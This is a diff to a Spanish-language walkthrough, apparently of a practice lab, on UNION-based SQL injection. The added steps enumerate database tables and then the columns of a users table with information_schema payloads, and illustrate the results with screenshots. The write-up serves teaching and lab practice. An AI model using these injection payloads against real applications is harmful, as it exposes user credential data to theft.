@@ -61,4 +61,18 @@ El servidor nos devuelve un código de estado 200, por lo que lo confirmamos.
 ```sql
 ' union select table_name, 'a' from information_schema.tables--
 ```
-<img width="1874" height="809" alt="image" src="https://github.com/user-attachments/assets/6e234aa1-9c87-4b2b-a0e4-a3a90fabb3db" />
+Hacemos la consulta y filtramos por `users`
+<img width="1882" height="835" alt="image" src="https://github.com/user-attachments/assets/7926eee4-3745-4627-8971-34247c0b908f" />
+
+
+La tabla más interesante parece ser `users_vrjlxy`.
+
+- Procedemos a listar las columnas dentro de la tabla `users_vrjlxy`, utilizamos el siguiente payload:
+```
+' union select column_name, 'a' from information_schema.columns where table_name= 'users_vrjlxy'--
+```
+Hacemos la consulta y filtramos por `username`:
+<img width="1876" height="813" alt="image" src="https://github.com/user-attachments/assets/8417ef67-0191-4557-8f8b-8feffa753e9a" />
+
+Obtenemos el username: `username_zsnozl`.
+
